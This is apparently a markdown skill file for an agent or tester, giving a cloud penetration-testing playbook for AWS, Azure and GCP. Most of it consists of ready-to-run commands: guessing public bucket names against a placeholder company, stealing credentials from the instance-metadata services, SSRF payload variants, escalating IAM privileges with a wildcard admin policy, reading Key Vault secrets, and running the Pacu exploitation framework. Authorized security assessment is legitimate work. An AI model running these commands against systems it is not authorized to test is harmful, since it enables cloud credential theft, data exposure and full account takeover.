---
name: aws_azure_gcp
description: Cloud security testing - AWS S3/IAM/EC2/Lambda, Azure blob/identity, GCP metadata, IMDS attacks, ScoutSuite, Pacu, Prowler
---

# Cloud Security Testing (AWS / Azure / GCP)

Cloud vulnerabilities stem from misconfigured IAM policies, exposed storage buckets, IMDS metadata access, over-privileged service accounts, and insecure serverless functions. Enumerate everything accessible with the current credentials before escalating.

## Phase 1: Discovery & Enumeration

### AWS CLI Enumeration

```bash
# Set credentials
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_DEFAULT_REGION=us-east-1

# Identify current principal
aws sts get-caller-identity

# List all S3 buckets
aws s3 ls

# List IAM permissions for current user/role
aws iam get-user
aws iam list-attached-user-policies --user-name username
aws iam list-user-policies --user-name username
aws iam simulate-principal-policy --policy-source-arn ARN \
  --action-names 's3:*' 'iam:*' 'ec2:*' 'lambda:*'

# Enumerate accessible services (no explicit permissions needed):
aws ec2 describe-instances 2>/dev/null
aws lambda list-functions 2>/dev/null
aws secretsmanager list-secrets 2>/dev/null
aws ssm get-parameters-by-path --path "/" --recursive 2>/dev/null
aws rds describe-db-instances 2>/dev/null
aws iam list-roles 2>/dev/null
```

### S3 Bucket Attacks

```bash
# Check if bucket is public (unauthenticated)
aws s3 ls s3://BUCKET_NAME --no-sign-request
aws s3 cp s3://BUCKET_NAME/sensitive_file.txt /tmp/ --no-sign-request

# Test all access levels
for action in ListBucket GetObject PutObject DeleteObject; do
    aws s3api get-bucket-acl --bucket BUCKET_NAME 2>/dev/null
done

# Public bucket discovery (via target name guessing)
COMPANY="targetcorp"
for suffix in "" "-dev" "-staging" "-backup" "-logs" "-data" "-files" "-assets" "-prod"; do
    bucket="${COMPANY}${suffix}"
    if aws s3 ls "s3://${bucket}" --no-sign-request 2>/dev/null; then
        echo "[OPEN] s3://${bucket}"
    fi
done

# Mass S3 discovery tools
S3Scanner -buckets buckets.txt --threads 20
```

### AWS IMDS (Instance Metadata Service)

```bash
# If SSRF exists or you have shell on EC2:

# IMDSv1 (vulnerable — no token required)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME
# Returns: AccessKeyId, SecretAccessKey, Token → use as temporary credentials

# IMDSv2 (requires session token — check if v1 disabled)
TOKEN=$(curl -s -X PUT http://169.254.169.254/latest/api/token \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -s http://169.254.169.254/latest/meta-data/ -H "X-aws-ec2-metadata-token: $TOKEN"

# User data (may contain secrets)
curl http://169.254.169.254/latest/user-data

# Via SSRF (try various SSRF payloads):
# http://169.254.169.254/latest/meta-data/iam/security-credentials/
# http://[::ffff:169.254.169.254]/latest/meta-data/  (IPv6-encoded)
# http://169.254.169.254.nip.io/latest/meta-data/
```

### IAM Privilege Escalation

```bash
# Common escalation paths:
# iam:PassRole + ec2:RunInstances → launch EC2 with admin role → IMDS steal
# iam:CreatePolicyVersion → add new policy version with AdministratorAccess
# iam:AttachUserPolicy → attach AdministratorAccess directly
# iam:CreateLoginProfile → create console password for other user

# Check with PACU
pacu
> import_keys profile_name
> run iam__brute_permissions
> run iam__privesc_scan

# Manual privilege escalation check
aws iam create-policy-version --policy-arn ARN \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default
```

## Phase 2: Azure

### Azure CLI Enumeration

```bash
# Login and enumerate
az login
az account list --output table
az account set --subscription SUBSCRIPTION_ID

# Current identity
az ad signed-in-user show

# List resource groups and resources
az group list --output table
az resource list --output table

# Storage account enumeration
az storage account list --output table
az storage container list --account-name ACCOUNT_NAME

# Check storage account public access
az storage account show --name ACCOUNT_NAME --query "publicNetworkAccess"
az storage container list --account-name ACCOUNT_NAME --auth-mode login

# Key Vault
az keyvault list
az keyvault secret list --vault-name VAULT_NAME
az keyvault secret show --vault-name VAULT_NAME --name SECRET_NAME  # if allowed
```

### Azure Blob Storage Attacks

```bash
# Check for public containers
az storage container list --account-name ACCOUNT_NAME --account-key KEY

# Anonymous access check
curl "https://ACCOUNT_NAME.blob.core.windows.net/CONTAINER?restype=container&comp=list"
# Returns XML with blobs if public

# Tools
BlobHunter -a ACCOUNT_NAME -k ACCOUNT_KEY
MicroBurst -StorageAccounts    # PowerShell
```

### Azure Managed Identity / IMDS

```bash
# From within Azure VM or App Service:
# Azure IMDS (analogous to AWS IMDSv2)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
# Returns: access_token for Azure Resource Manager API

# Use token to list subscriptions
TOKEN=$(curl ... | python3 -c "import sys,json; print(json.load(sys.stdin)['access_token'])")
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions?api-version=2020-01-01"
```

## Phase 3: GCP

### GCP CLI Enumeration

```bash
# Auth check
gcloud auth list
gcloud config list

# Project enumeration
gcloud projects list
gcloud projects get-iam-policy PROJECT_ID --format json

# Service account enumeration
gcloud iam service-accounts list
gcloud iam service-accounts keys list --iam-account SA_EMAIL

# Storage buckets
gsutil ls
gsutil ls -l BUCKET_URL
gsutil cat gs://BUCKET_NAME/sensitive_file

# Check for public buckets
curl https://storage.googleapis.com/BUCKET_NAME
```

### GCP Metadata Server

```bash
# From within GCE instance:
curl "http://metadata.google.internal/computeMetadata/v1/" -H "Metadata-Flavor: Google"
curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  -H "Metadata-Flavor: Google"
# Returns access token → use for GCP API calls

# Project attributes (may contain secrets)
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/" \
  -H "Metadata-Flavor: Google"
```

## Phase 4: Automated Cloud Security Assessment

```bash
# ScoutSuite — multi-cloud audit (AWS, Azure, GCP)
scout aws --profile default --report-dir /tmp/scout_report
scout azure --cli

# Prowler — AWS CIS benchmarks + GDPR/PCI compliance checks
prowler aws -M csv,json -o /tmp/prowler_output

# Pacu — AWS exploitation framework
python3 pacu.py
> import_keys [profile_name]
> run iam__enum_permissions
> run iam__privesc_scan
> run s3__bucket_finder
> run ec2__enum

# Cartography — attack path graph (like BloodHound for cloud)
cartography --neo4j-uri bolt://localhost:7687
```

## Common High-Impact Findings

| Finding | Severity | Check |
|---------|----------|-------|
| Public S3 bucket with sensitive data | Critical | `aws s3 ls --no-sign-request` |
| IMDS v1 enabled (SSRF → credential theft) | Critical | Check for SSRF + `169.254.169.254` |
| Over-permissive IAM (*:* policy) | High | `iam simulate-principal-policy` |
| Secrets in EC2 user-data | High | Check `169.254.169.254/latest/user-data` |
| Secrets in GCP metadata project attrs | High | Check metadata server |
| KMS key accessible to all | High | Check key policy |
| CloudTrail logging disabled | Medium | `aws cloudtrail describe-trails` |
| S3 server-access logging disabled | Low | Affects incident response |
| Public ECR container images | High | `aws ecr list-images` |

## Validation Approach

1. Confirm current identity (sts get-caller-identity / az ad signed-in-user show)
2. Enumerate accessible resources without requiring elevated permissions
3. Check all storage for unauthenticated read access first
4. Test IMDS/metadata endpoint from any SSRF vulnerability
5. Document: command run → exact output showing vulnerability → data accessible

## Tools

- `aws-cli` / `gcloud` / `az` — primary enumeration tools
- `ScoutSuite` — comprehensive cloud security audit
- `Prowler` — AWS compliance + security findings
- `Pacu` — AWS exploitation framework
- `S3Scanner` / `BlobHunter` — storage bucket discovery
- `cartography` — cloud attack path mapping
